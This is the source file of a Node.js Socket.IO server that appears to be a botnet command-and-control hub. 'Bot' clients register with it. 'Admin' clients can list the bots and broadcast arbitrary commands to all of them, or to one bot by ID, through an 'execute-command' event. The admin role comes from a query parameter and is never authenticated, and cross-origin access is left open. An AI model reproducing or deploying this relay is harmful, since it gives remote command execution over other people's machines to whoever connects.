import express from "express";
const app = express();

import http from "http";
const httpServer = http.Server(app);

import { Server } from "socket.io";

export const io = new Server(httpServer, {
  cors: {
    origin: "*",
  },
});

import cors from "cors";
const whitelist = ["http://localhost:3000"];
const corsOptions = {
  origin: function (origin, callback) {
    if ((whitelist.indexOf(origin) !== -1) | !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

app.use(cors(corsOptions));

/*app.get("/", function (req, res) {
  res.send("Hello");
});*/

const connectedBots = new Set();

//Whenever someone connects this gets executed
io.on("connection", function (socket) {

  const role = socket.request._query.role;

  if (role == "bot") {
    console.log("Bot " + socket.id + " connected");
    io.to("admins").emit("log", "Bot " + socket.id + " connected");

    connectedBots.add(socket.id);
    socket.join("bots");
  } else if (role == "admin") {
    console.log("New admin connected");
    io.to("admins").emit("log", "New admin connected");

    socket.join("admins");
  }

  //Whenever someone disconnects this piece of code executed
  socket.on("disconnect", function () {
    if (role == "bot") {
      console.log("Bot " + socket.id + " disconnected");
      io.to("admins").emit("log", "Bot " + socket.id + " disconnected");
      connectedBots.delete(socket.id);
    } else if (role == "admin") {
      console.log("Admin disconnected");
      io.to("admins").emit("log", "Admin disconnected");
    }
  });

  socket.on("send-command", (command) => {
    if (role == "bot") {
      return;
    }
    if (role == "admin") {
      console.log("command is: " + command);
      if (command == "list") {
        let ids = "";
        connectedBots.forEach((id) => (ids += id + "\n"));
        io.to("admins").emit("log", "Connected bots \n" + ids);
        return;
      }
      handleCommand(command);
    }
  });

  socket.on("log", (log) => {
    if (role == "bot") {
      io.to("admins").emit("log", "bot " + socket.id + " " + log);
    }
  });

  socket.on("error", () => {});
});

function handleCommand(command) {
  const args = command.split(" ");
  if (args[0] == "bot") {
    if (args.length <= 1) {
      io.to("admins").emit("unexisting bot");
      return;
    }
    const id = args[1];
    args.splice(0, 2);
    console.log("emitting to: " + id + " " + args.join(" "));
    io.to(id).emit("execute-command", args.join(" "));
    return;
  }
  io.to("bots").emit("execute-command", command);
}

httpServer.listen(8080, function () {
  console.log("listening on port 8080");
});
